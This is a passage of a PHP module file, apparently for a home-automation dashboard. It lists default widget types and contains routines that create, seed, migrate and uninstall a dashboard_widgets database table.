            array('text', 'fas fa-font', 'Text', 'Display text'),
            array('slider', 'fas fa-sliders-h', 'Slider', 'Slider for control'),
            array('select', 'fas fa-list', 'Select', 'Select from options'),
            array('button', 'fas fa-play', 'Button', 'Execute method'),
            array('clock', 'fas fa-clock', 'Clock', 'Digital clock'),
            array('iframe', 'fas fa-window-maximize', 'iFrame', 'Embedded page'),
            array('image', 'fas fa-image', 'Image', 'Display image'),
            array('panellink', 'fas fa-link', 'Panel link', 'Go to another panel'),
            array('rgb', 'fas fa-palette', 'RGB', 'Color control'),
            array('progressbar', 'fas fa-chart-bar', 'Progress bar', 'Progress bar'),
            array('gauge', 'fas fa-gauge-high', 'Gauge', 'Circular gauge'),
            array('test', 'fas fa-flask', 'Test', 'Test widget'),
            array('unknown', 'fas fa-question-circle', 'Unknown', 'Unknown widget type'),
            array('sendtext', 'fas fa-paper-plane', 'Send text', 'Send text to URL'),
            array('analogclock', 'fas fa-clock', 'Analog clock', 'Analog clock'),
            array('status', 'fas fa-info-circle', 'Status', 'Object status display'),
            array('datepicker', 'fas fa-calendar-alt', 'Date picker', 'Date picker'),
            array('timepicker', 'fas fa-clock', 'Time picker', 'Time picker'),
            array('roundslider', 'fas fa-circle', 'Round slider', 'Round slider'),
            array('graph', 'fas fa-chart-line', 'Graph', 'Value graph'),
            array('bargraph', 'fas fa-chart-bar', 'Bar graph', 'Bar chart'),
            array('weather', 'fas fa-cloud-sun', 'Weather', 'Weather forecast'),
            array('table', 'fas fa-table', 'Table', 'Data table'),
            array('timeline', 'fas fa-stream', 'Timeline', 'Event timeline'),
            array('group', 'fas fa-layer-group', 'Group', 'Widget group'),
            array('map', 'fas fa-map-marker-alt', 'Map', 'Map with marker'),
            array('calendar', 'fas fa-calendar-alt', 'Calendar', 'Calendar'),
            array('colorslider', 'fas fa-palette', 'Color (sliders)', 'Color with RGB sliders'),
            array('empty', 'fas fa-square', 'Empty', 'Empty separator'),
            array('keypad', 'fas fa-th', 'Keypad', 'Numeric keypad'),
            array('roominfo', 'fas fa-home', 'Room info', 'Room indicators'),
            array('slideshow', 'fas fa-images', 'Slideshow', 'Image slideshow'),
            array('sliderbuttons', 'fas fa-plus-minus', 'Slider with buttons', 'Slider with +/- buttons'),
            array('thermostat', 'fas fa-thermometer-half', 'Thermostat', 'Temperature control'),
            array('trend', 'fas fa-chart-line', 'Trend', 'Value trend'),
            array('tvremote', 'fas fa-tv', 'TV remote', 'TV remote control'),
            array('musicremote', 'fas fa-music', 'Music remote', 'Music center remote control'),
            array('acremote', 'fas fa-snowflake', 'AC remote', 'Air conditioner remote control'),
        );
    }

    function ensureWidgetsTable()
    {
        $tables = SQLSelect("SHOW TABLES LIKE 'dashboard_widgets'");
        if (count($tables) == 0) {
            SQLExec("CREATE TABLE dashboard_widgets (
                ID int(10) unsigned NOT NULL auto_increment,
                TYPE varchar(100) NOT NULL DEFAULT '',
                ICON varchar(100) NOT NULL DEFAULT '',
                TITLE varchar(255) NOT NULL DEFAULT '',
                DESCRIPTION varchar(255) NOT NULL DEFAULT '',
                PRIORITY int(10) NOT NULL DEFAULT '0',
                FILE varchar(255) NOT NULL DEFAULT '',
                PRIMARY KEY (ID)
            )");
        }
        $fields = SQLGetFields('dashboard_widgets');
        $hasFile = false;
        if (is_array($fields)) {
            foreach ($fields as $f) {
                if ($f['Field'] == 'FILE') $hasFile = true;
            }
        }
        if (!$hasFile) {
            SQLExec("ALTER TABLE dashboard_widgets ADD FILE varchar(255) NOT NULL DEFAULT ''");
        }
        $cnt = SQLSelectOne("SELECT COUNT(*) as CNT FROM dashboard_widgets");
        if (!$cnt || $cnt['CNT'] == 0) {
            $priority = 0;
            foreach ($this->widgetDefaults() as $w) {
                $rec = array(
                    'TYPE' => $w[0],
                    'ICON' => $w[1],
                    'TITLE' => $w[2],
                    'DESCRIPTION' => $w[3],
                    'PRIORITY' => $priority++,
                    'FILE' => 'js/widgets/' . $w[0] . '.js'
                );
                SQLInsert('dashboard_widgets', $rec);
            }
        } else {
            $priority = (int)SQLSelectOne("SELECT MAX(PRIORITY) as MX FROM dashboard_widgets")['MX'] + 1;
            foreach ($this->widgetDefaults() as $w) {
                $exists = SQLSelectOne("SELECT ID FROM dashboard_widgets WHERE TYPE LIKE '" . DBSafe($w[0]) . "'");
                if (!$exists) {
                    $rec = array(
                        'TYPE' => $w[0],
                        'ICON' => $w[1],
                        'TITLE' => $w[2],
                        'DESCRIPTION' => $w[3],
                        'PRIORITY' => $priority++,
                        'FILE' => 'js/widgets/' . $w[0] . '.js'
                    );
                    SQLInsert('dashboard_widgets', $rec);
                }
            }
            SQLExec("UPDATE dashboard_widgets SET FILE = CONCAT('js/widgets/', TYPE, '.js') WHERE FILE = '' OR FILE IS NULL");
        }
    }

    function install($data = '')
    {
        parent::install();
    }

    function dbInstall($data)
    {
        $data = <<<EOD
dashboard_widgets: ID int(10) unsigned NOT NULL auto_increment
dashboard_widgets: TYPE varchar(100) NOT NULL DEFAULT ''
dashboard_widgets: ICON varchar(100) NOT NULL DEFAULT ''
dashboard_widgets: TITLE varchar(255) NOT NULL DEFAULT ''
dashboard_widgets: DESCRIPTION varchar(255) NOT NULL DEFAULT ''
dashboard_widgets: PRIORITY int(10) NOT NULL DEFAULT '0'
dashboard_widgets: FILE varchar(255) NOT NULL DEFAULT ''

EOD;
        parent::dbInstall($data);
        $this->ensureWidgetsTable();
    }

    function uninstall()
    {
        $class = SQLSelectOne("SELECT * FROM classes WHERE TITLE='DashBoard_Pro'");
        if ($class) {
            SQLExec("DELETE FROM properties WHERE CLASS_ID=" . (int)$class['ID']);
            SQLExec("DELETE FROM objects WHERE CLASS_ID=" . (int)$class['ID']);
            SQLExec("DELETE FROM classes WHERE ID=" . (int)$class['ID']);
        }
        $tables = SQLSelect("SHOW TABLES LIKE 'dashboard_widgets'");
        if (count($tables) > 0) {
            SQLExec("DROP TABLE dashboard_widgets");
        }
        parent::uninstall();
    }
}
